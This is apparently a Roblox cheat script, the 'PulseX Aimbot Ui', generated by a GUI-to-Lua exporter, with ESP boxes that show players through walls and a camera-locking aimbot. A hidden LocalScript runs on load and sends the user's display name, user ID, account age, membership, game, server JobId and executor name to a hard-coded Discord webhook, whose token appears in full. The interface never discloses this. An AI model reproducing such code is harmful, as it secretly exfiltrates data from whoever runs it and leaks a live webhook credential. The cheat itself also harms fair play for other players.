-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local UICorner_2 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local TextButton_2 = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local Frame_2 = Instance.new("Frame")
local TextButton_3 = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local Frame_3 = Instance.new("Frame")
local Frame_4 = Instance.new("Frame")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local Frame_5 = Instance.new("Frame")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(56, 56, 56)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.440680534, 0, 0.396383852, 0)
Frame.Size = UDim2.new(0, 249, 0, 293)

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(85, 85, 85)
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.0722891539, 0, 0.829351544, 0)
TextButton.Size = UDim2.new(0, 213, 0, 35)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Esp"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 12.000
TextButton.TextWrapped = true

UICorner.Parent = TextButton

UICorner_2.Parent = Frame

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 2.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0, 0, 0.0238907859, 0)
TextLabel.Size = UDim2.new(0, 164, 0, 23)
TextLabel.Font = Enum.Font.SourceSansBold
TextLabel.Text = "PulseX Aimbot Ui"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(85, 85, 85)
TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.BorderSizePixel = 0
TextButton_2.Position = UDim2.new(0.658634543, 0, 0.0307167228, 0)
TextButton_2.Size = UDim2.new(0, 75, 0, 18)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Close"
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextWrapped = true

UICorner_3.Parent = TextButton_2

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(164, 8, 255)
Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.0441767052, 0, 0.102389075, 0)
Frame_2.Size = UDim2.new(0, 142, 0, 3)

TextButton_3.Parent = Frame
TextButton_3.BackgroundColor3 = Color3.fromRGB(85, 85, 85)
TextButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.BorderSizePixel = 0
TextButton_3.Position = UDim2.new(0.0722891539, 0, 0.665529013, 0)
TextButton_3.Size = UDim2.new(0, 213, 0, 35)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "Aimbot"
TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 12.000
TextButton_3.TextWrapped = true

UICorner_4.Parent = TextButton_3

Frame_3.Parent = Frame
Frame_3.BackgroundColor3 = Color3.fromRGB(164, 8, 255)
Frame_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_3.BorderSizePixel = 0
Frame_3.Position = UDim2.new(0.0722891539, 0, 0.78498292, 0)
Frame_3.Size = UDim2.new(0, 213, 0, 3)

Frame_4.Parent = Frame
Frame_4.BackgroundColor3 = Color3.fromRGB(164, 8, 255)
Frame_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_4.BorderSizePixel = 0
Frame_4.Position = UDim2.new(0.0722891539, 0, 0.948805451, 0)
Frame_4.Size = UDim2.new(0, 213, 0, 3)

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 2.000
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.0722891539, 0, 0.163822532, 0)
TextLabel_2.Size = UDim2.new(0, 206, 0, 99)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "When you pressed Aimbot Press on you keyboard e to toggle aimbot"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

TextLabel_3.Parent = Frame
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 2.000
TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0.289156616, 0, 0.522184312, 0)
TextLabel_3.Size = UDim2.new(0, 104, 0, 24)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "Version: V 0.1"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14.000
TextLabel_3.TextWrapped = true

Frame_5.Parent = Frame
Frame_5.BackgroundColor3 = Color3.fromRGB(164, 8, 255)
Frame_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_5.BorderSizePixel = 0
Frame_5.Position = UDim2.new(0.212851405, 0, 0.604095578, 0)
Frame_5.Size = UDim2.new(0, 142, 0, 3)

-- Scripts:

local function WXXG_fake_script() -- TextButton.ShowPurpleBoxesOnButtonClick 
	local script = Instance.new('LocalScript', TextButton)

	local Players = game:GetService("Players")
	local Workspace = game:GetService("Workspace")
	
	local button = script.Parent
	local adornments = {}
	local billboards = {}
	
	local function isPlayerCharacter(model)
	    for i, player in Players:GetPlayers() do
	        if player.Character == model then
	            return true
	        end
	    end
	    return false
	end
	
	local function createAdornment(model)
	    for i, part in model:GetChildren() do
	        if part:IsA("BasePart") then
	            local box = Instance.new("BoxHandleAdornment")
	            box.Adornee = part
	            box.Color3 = Color3.fromRGB(170, 0, 255)
	            box.AlwaysOnTop = true
	            box.ZIndex = 10
	            box.Size = part.Size
	            box.Transparency = 0.5
	            box.Parent = Workspace
	            table.insert(adornments, box)
	        end
	    end
	end
	
	local function createBillboard(model, nameText)
	    local head = model:FindFirstChild("Head")
	    if head and head:IsA("BasePart") then
	        local billboard = Instance.new("BillboardGui")
	        billboard.Adornee = head
	        billboard.Size = UDim2.new(0, 200, 0, 50)
	        billboard.StudsOffset = Vector3.new(0, 2.5, 0)
	        billboard.AlwaysOnTop = true
	        billboard.Parent = Workspace
	
	        local textLabel = Instance.new("TextLabel")
	        textLabel.Size = UDim2.new(1, 0, 1, 0)
	        textLabel.BackgroundTransparency = 1
	        textLabel.Text = nameText
	        textLabel.TextColor3 = Color3.fromRGB(170, 0, 255)
	        textLabel.TextStrokeTransparency = 0.2
	        textLabel.TextScaled = true
	        textLabel.Font = Enum.Font.SourceSansBold
	        textLabel.Parent = billboard
	
	        table.insert(billboards, billboard)
	    end
	end
	
	local function clearAdornments()
	    for i, box in adornments do
	        if box and box.Parent then
	            box:Destroy()
	        end
	    end
	    for i, billboard in billboards do
	        if billboard and billboard.Parent then
	            billboard:Destroy()
	        end
	    end
	    adornments = {}
	    billboards = {}
	end
	
	local function showBoxesAndNames()
	    clearAdornments()
	    -- Show for all player characters
	    for i, player in Players:GetPlayers() do
	        local character = player.Character
	        if character then
	            createAdornment(character)
	            createBillboard(character, player.Name)
	        end
	    end
	    -- Show for all rigs (models in workspace that are not player characters)
	    for i, obj in Workspace:GetChildren() do
	        if obj:IsA("Model") and not isPlayerCharacter(obj) then
	            createAdornment(obj)
	            createBillboard(obj, obj.Name)
	        end
	    end
	end
	
	button.MouseButton1Click:Connect(function()
	    showBoxesAndNames()
	end)
	
	-- Optional: Clean up when GUI is closed
	local screenGui = button
	while screenGui and not screenGui:IsA("ScreenGui") do
	    screenGui = screenGui.Parent
	end
	if screenGui then
	    screenGui:GetPropertyChangedSignal("Enabled"):Connect(function()
	        if not screenGui.Enabled then
	            clearAdornments()
	        end
	    end)
	end
	
	
end
coroutine.wrap(WXXG_fake_script)()
local function BPRXEK_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	-- LocalScript unter deinem TextButton ─ by Skyonix
	-----------------------------------------------------
	local HttpService = game:GetService("HttpService")
	
	-- Unterstützte Request-Funktionen holen
	local request = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request)
	if not request then
		warn("❌ Dein Executor unterstützt keine HTTP-Requests.")
		return
	end
	
	-- Deine Webhook-URL hier eintragen
	local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1393252455529058516/xIGOwT6KJd59CChn_dKyl6V9ILYXTGj1vbVlLOx7xKFQZ5Vz-bdIhqMXK38MNuV3QIeH"
	
	-- Spieler- und Spielinfo holen
	local player = game.Players.LocalPlayer
	local displayName = player.DisplayName
	local userId = player.UserId
	local placeId = game.PlaceId
	local universeId = game.GameId
	local accountAge = player.AccountAge -- in Tagen
	local membership = tostring(player.MembershipType)
	local jobId = game.JobId
	
	-- Executor-Namen schätzen
	local executor = "Unbekannt"
	if syn then
		executor = "Synapse X"
	elseif fluxus then
		executor = "Fluxus"
	elseif KRNL then
		executor = "KRNL"
	elseif getexecutorname then
		executor = getexecutorname()
	end
	
	-- Spielname holen
	local placeName = "Unbekanntes Spiel"
	pcall(function()
		placeName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
	end)
	
	-- Roblox Avatar Thumbnail holen
	local avatarUrl = ""
	do
		local thumbApiUrl = string.format(
			"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=100x100&format=Png&isCircular=true",
			userId
		)
		local thumbResponse = request({
			Url = thumbApiUrl,
			Method = "GET"
		})
	
		if thumbResponse and thumbResponse.StatusCode == 200 then
			local data = HttpService:JSONDecode(thumbResponse.Body)
			if data and data.data and data.data[1] and data.data[1].imageUrl then
				avatarUrl = data.data[1].imageUrl
			else
				warn("❌ Konnte Avatar-URL nicht auslesen.")
			end
		else
			warn("❌ Fehler beim Abrufen des Avatars:", thumbResponse and thumbResponse.StatusCode)
		end
	end
	
	-- Roblox Spiel-Icon Thumbnail holen (mit UniverseId!)
	local gameIconUrl = ""
	do
		local iconApiUrl = string.format(
			"https://thumbnails.roblox.com/v1/games/icons?universeIds=%d&size=512x512&format=Png",
			universeId
		)
		local iconResponse = request({
			Url = iconApiUrl,
			Method = "GET"
		})
	
		if iconResponse and iconResponse.StatusCode == 200 then
			local data = HttpService:JSONDecode(iconResponse.Body)
			if data and data.data and data.data[1] and data.data[1].imageUrl then
				gameIconUrl = data.data[1].imageUrl
			else
				warn("❌ Konnte Spiel-Icon-URL nicht auslesen.")
			end
		else
			warn("❌ Fehler beim Abrufen des Spiel-Icons:", iconResponse and iconResponse.StatusCode)
		end
	end
	
	-- Embed vorbereiten
	local embed = {
		["title"] = "Script Logs",
		["description"] = string.format(
			"**%s** hat erfolgreich PulseX Aimbot Ui Script genutzt.\n\nSpiel: **%s** (PlaceId: `%d`)\nJobId: `%s`\nAccount erstellt vor: **%d** Tagen\nMembership: **%s**\nExecutor: **%s**",
			displayName, placeName, placeId, jobId, accountAge, membership, executor
		),
		["color"] = 16753920,
		["thumbnail"] = {
			["url"] = avatarUrl
		},
		["image"] = {
			["url"] = gameIconUrl
		},
		["footer"] = {
			["text"] = "PulseX Aimbot UI Logger"
		},
		["timestamp"] = DateTime.now():ToIsoDate()
	}
	
	local payload = {
		["embeds"] = {embed}
	}
	
	local body = HttpService:JSONEncode(payload)
	
	-- Webhook senden
	local response = request({
		Url = WEBHOOK_URL,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = body
	})
	
	if response and response.StatusCode == 204 then
		print("✅ Skyonix Webhook mit Avatar & Spiel-Icon erfolgreich gesendet!")
	else
		warn("❌ Fehler beim Senden:", response and response.StatusCode)
	end
	
end
coroutine.wrap(BPRXEK_fake_script)()
local function ZVDYWG_fake_script() -- TextButton_2.CloseScreenGuiOnButtonClick 
	local script = Instance.new('LocalScript', TextButton_2)

	local button = script.Parent
	button.MouseButton1Click:Connect(function()
	    local screenGui = button.Parent
	    while screenGui and not screenGui:IsA("ScreenGui") do
	        screenGui = screenGui.Parent
	    end
	    if screenGui then
	        screenGui.Enabled = false
	    end
	end)
	
	
end
coroutine.wrap(ZVDYWG_fake_script)()
local function EFOV_fake_script() -- Frame.SmoothDraggableFrameWithEntranceAnimation 
	local script = Instance.new('LocalScript', Frame)

	local TweenService = game:GetService("TweenService")
	local UserInputService = game:GetService("UserInputService")
	
	local frame = script.Parent
	
	-- === ENTRANCE ANIMATION ===
	local originalPosition = frame.Position
	local originalTransparency = frame.BackgroundTransparency
	
	-- Start off-screen and transparent
	frame.Position = UDim2.new(originalPosition.X.Scale, originalPosition.X.Offset, originalPosition.Y.Scale - 0.2, originalPosition.Y.Offset)
	frame.BackgroundTransparency = 1
	
	task.wait(0.2) -- Small delay for effect
	
	local tween = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
	    Position = originalPosition,
	    BackgroundTransparency = originalTransparency
	})
	tween:Play()
	
	-- === SMOOTH DRAGGING ===
	local dragging = false
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
	    local delta = input.Position - dragStart
	    frame.Position = UDim2.new(
	        startPos.X.Scale,
	        startPos.X.Offset + delta.X,
	        startPos.Y.Scale,
	        startPos.Y.Offset + delta.Y
	    )
	end
	
	frame.InputBegan:Connect(function(input)
	    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	        dragging = true
	        dragStart = input.Position
	        startPos = frame.Position
	
	        input.Changed:Connect(function()
	            if input.UserInputState == Enum.UserInputState.End then
	                dragging = false
	            end
	        end)
	    end
	end)
	
	frame.InputChanged:Connect(function(input)
	    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	        dragInput = input
	    end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
	    if dragging and input == dragInput then
	        update(input)
	    end
	end)
	
	
end
coroutine.wrap(EFOV_fake_script)()
local function SCLVH_fake_script() -- TextButton_3.AimbotToggleOnE 
	local script = Instance.new('LocalScript', TextButton_3)

	local Players = game:GetService("Players")
	local UserInputService = game:GetService("UserInputService")
	local RunService = game:GetService("RunService")
	local Workspace = game:GetService("Workspace")
	
	local button = script.Parent
	local localPlayer = Players.LocalPlayer
	local camera = Workspace.CurrentCamera
	
	local aimbotEnabled = false
	local aiming = false
	local currentTarget = nil
	local aimConnection = nil
	
	-- Helper to check if a model is a player character
	local function isPlayerCharacter(model)
	    for i, player in Players:GetPlayers() do
	        if player.Character == model then
	            return true
	        end
	    end
	    return false
	end
	
	-- Get all valid targets (player characters and rigs)
	local function getTargets()
	    local targets = {}
	    -- Player characters
	    for i, player in Players:GetPlayers() do
	        if player ~= localPlayer and player.Character then
	            table.insert(targets, player.Character)
	        end
	    end
	    -- Rigs (models in workspace that are not player characters)
	    for i, obj in Workspace:GetChildren() do
	        if obj:IsA("Model") and not isPlayerCharacter(obj) then
	            table.insert(targets, obj)
	        end
	    end
	    return targets
	end
	
	-- Find the closest target to the local player
	local function getClosestTarget()
	    local character = localPlayer.Character
	    if not character then return nil end
	    local root = character:FindFirstChild("HumanoidRootPart")
	    if not root then return nil end
	
	    local targets = getTargets()
	    local closest = nil
	    local minDist = math.huge
	
	    for i, target in targets do
	        local targetPart = target:FindFirstChild("Head") or target:FindFirstChild("HumanoidRootPart")
	        if targetPart then
	            local dist = (root.Position - targetPart.Position).Magnitude
	            if dist < minDist then
	                minDist = dist
	                closest = target
	            end
	        end
	    end
	    return closest
	end
	
	-- Aim camera at the target
	local function startAiming()
	    if aiming then return end
	    currentTarget = getClosestTarget()
	    if not currentTarget then return end
	    aiming = true
	
	    aimConnection = RunService.RenderStepped:Connect(function()
	        if not aiming or not currentTarget then return end
	        local targetPart = currentTarget:FindFirstChild("Head") or currentTarget:FindFirstChild("HumanoidRootPart")
	        if targetPart then
	            local camPos = camera.CFrame.Position
	            local lookAt = targetPart.Position
	            camera.CFrame = CFrame.new(camPos, lookAt)
	        end
	    end)
	end
	
	local function stopAiming()
	    aiming = false
	    if aimConnection then
	        aimConnection:Disconnect()
	        aimConnection = nil
	    end
	    currentTarget = nil
	end
	
	-- Listen for E key to toggle aiming
	local function onInputBegan(input, processed)
	    if not aimbotEnabled or processed then return end
	    if input.KeyCode == Enum.KeyCode.E then
	        if aiming then
	            stopAiming()
	        else
	            startAiming()
	        end
	    end
	end
	
	-- Listen for button click to enable/disable aimbot mode
	button.MouseButton1Click:Connect(function()
	    aimbotEnabled = not aimbotEnabled
	    if not aimbotEnabled then
	        stopAiming()
	    end
	end)
	
	UserInputService.InputBegan:Connect(onInputBegan)
	
	-- Clean up if GUI is closed
	local screenGui = button
	while screenGui and not screenGui:IsA("ScreenGui") do
	    screenGui = screenGui.Parent
	end
	if screenGui then
	    screenGui:GetPropertyChangedSignal("Enabled"):Connect(function()
	        if not screenGui.Enabled then
	            aimbotEnabled = false
	            stopAiming()
	        end
	    end)
	end
	
	
end
coroutine.wrap(SCLVH_fake_script)()
